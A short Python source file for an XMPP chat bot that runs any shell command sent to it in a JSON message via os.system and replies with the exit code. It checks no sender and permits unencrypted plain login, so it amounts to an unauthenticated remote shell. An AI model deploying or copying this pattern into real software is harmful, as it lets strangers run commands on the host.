import json
import os
import sleekxmpp

from concurrent.futures import ThreadPoolExecutor


class XMPPClient(sleekxmpp.ClientXMPP):
    def __init__(self, jid, password):
        sleekxmpp.ClientXMPP.__init__(self, jid, password)
        self.add_event_handler("session_start", self.session_start, threaded=True)
        self.add_event_handler("message", self.message)
        self['feature_mechanisms'].unencrypted_plain = True
        self.executor = ThreadPoolExecutor(max_workers=1000)

    def session_start(self, event):
        self.send_presence()
        self.get_roster()

    def message(self, msg):
        try:
            if msg['type'] in ('chat', 'normal'):
                self.executor.submit(self.handle_request, msg)
        except Exception as e:
            no, err = e.args
            print("Exception({0}): {1}".format(no, err))

    def handle_request(self, msg):
        body = json.loads(msg['body'])
        command = body['command']
        try:
            body['out'] = os.system(command)
        except Exception as e:
            body['err'] = str(e)
        finally:
            msg['body'] = json.dumps(body)
            self.response(msg)

    def response(self, msg):
        self.send_message(
            mto=msg['from'],
            mbody=msg['body'],
            mtype='chat')
